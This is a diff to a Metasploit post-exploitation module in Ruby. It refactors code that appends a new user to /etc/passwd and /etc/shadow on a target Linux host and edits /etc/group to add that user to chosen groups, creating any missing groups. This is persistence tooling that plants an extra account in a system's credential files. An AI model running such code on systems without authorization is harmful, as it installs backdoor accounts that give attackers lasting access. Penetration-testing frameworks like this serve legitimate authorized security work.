@@ -67,6 +67,27 @@ class MetasploitModule < Msf::Post
     print_line(cmd_exec(command))
   end
 
+  def fs_add_groups(group_file, groups)
+    groups.each do |group|
+      # Add user to group if there are other users
+      group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}")
+      # Add user to group of no users belong to that group yet
+      group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
+    end
+    if datastore['MissingGroups'] == 'CREATE'
+      new_groups = get_missing_groups(group_file, groups)
+      new_groups.each do |group|
+        gid = rand(1000..2000).to_s
+        group_file += "\n#{group}:x:#{gid}:#{datastore['USERNAME']}\n"
+        print_good("Added #{group} group")
+      end
+    end
+    group_file.gsub(/\n{2,}/, "\n")
+  end
+
+  def get_missing_groups(group_file, groups)
+    groups.reject { |group| check_group_exists?(group, group_file) }
+  end
   # Finds out what platform the module is running on. It will attempt to access
   # the Hosts database before making more noise on the target to learn more
   def os_platform
@@ -116,7 +137,7 @@ class MetasploitModule < Msf::Post
 
     # Check to see that groups exist or fail
     group_file = read_file('/etc/group').to_s
-    groups_missing = groups.reject { |group| check_group_exists?(group, group_file) }
+    groups_missing = get_missing_groups(group_file, groups)
 
     unless groups_missing.empty?
       if datastore['MissingGroups'] == 'ERROR'
@@ -226,23 +247,9 @@ class MetasploitModule < Msf::Post
       vprint_status("\'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd")
       append_file('/etc/shadow', "#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::")
       vprint_status("\'#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\' >> /etc/shadow")
-      group_file_save = group_file
 
-      groups.each do |group|
-        # Add user to group if there are other users
-        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}")
-        # Add user to group of no users belong to that group yet
-        group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
-      end
-      if datastore['MissingGroups'] == 'CREATE'
-        groups_missing.each do |group|
-          gid = rand(1000..2000).to_s
-          group_file += "\n#{group}:x:#{gid}:#{datastore['USERNAME']}\n"
-          print_good("Added #{group} group")
-        end
-      end
-      group_file = group_file.gsub(/\n{2,}/, "\n")
-      write_file('/etc/group', group_file) unless group_file == group_file_save
+      altered_group_file = fs_add_groups(group_file, groups)
+      write_file('/etc/group', altered_group_file) unless group_file == altered_group_file
 
       groups_handled = true
     end
